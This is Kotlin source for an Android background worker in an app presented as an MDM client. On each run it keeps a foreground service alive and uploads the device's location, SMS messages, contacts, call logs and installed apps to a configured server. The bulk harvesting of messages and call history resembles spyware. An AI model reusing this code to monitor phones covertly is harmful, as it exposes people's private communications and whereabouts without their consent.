package com.mdm.client.workers

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.mdm.client.collectors.*
import com.mdm.client.config.AppConfig
import com.mdm.client.network.ApiClient
import com.mdm.client.service.MdmForegroundService
import com.mdm.client.util.NetworkUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

class DataSyncWorker(context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "SyncWkr"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        Log.i(TAG, "DataSyncWorker running")
        val ctx = applicationContext

        if (!AppConfig.isConfigured(ctx)) {
            Log.w(TAG, "Server not configured, skipping sync")
            return@withContext Result.success()
        }

        // Ensure foreground service is running
        try {
            val intent = Intent(ctx, MdmForegroundService::class.java)
            ContextCompat.startForegroundService(ctx, intent)
        } catch (e: Exception) {
            Log.w(TAG, "Could not start service: ${e.message}")
        }

        val apiClient = ApiClient(ctx)
        val deviceId = AppConfig.getDeviceId(ctx)
        val deviceIp = NetworkUtils.getLocalIpAddress(ctx)

        try {
            // Heartbeat re-registration
            apiClient.registerDevice(deviceId, deviceIp)

            // Push location
            val locationCollector = LocationCollector(ctx)
            val loc = locationCollector.getFreshLocation()
            if (loc["status"] == "success") {
                apiClient.pushLocation(
                    deviceId = deviceId,
                    latitude = (loc["latitude"] as? Double) ?: 0.0,
                    longitude = (loc["longitude"] as? Double) ?: 0.0,
                    accuracy = ((loc["accuracy"] as? Float) ?: 0f),
                    provider = (loc["provider"] as? String) ?: "unknown",
                    timestamp = (loc["timestamp"] as? Long) ?: System.currentTimeMillis()
                )
            }

            // Push SMS
            val smsCollector = SmsCollector(ctx)
            val messages = smsCollector.getMessages()
            if (messages.isNotEmpty()) {
                apiClient.pushSms(deviceId, messages)
            }

            // Push contacts
            val contactsCollector = ContactsCollector(ctx)
            val contacts = contactsCollector.getContacts()
            if (contacts.isNotEmpty()) {
                apiClient.pushContacts(deviceId, contacts)
            }

            // Push call logs
            val callLogCollector = CallLogCollector(ctx)
            val calls = callLogCollector.getCallLogs()
            if (calls.isNotEmpty()) {
                apiClient.pushCallLogs(deviceId, calls)
            }

            // Push installed apps
            val appsCollector = AppsCollector(ctx)
            val apps = appsCollector.getApps()
            if (apps.isNotEmpty()) {
                apiClient.pushApps(deviceId, apps)
            }

            Log.i(TAG, "Sync complete")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed: ${e.message}")
            Result.retry()
        }
    }
}
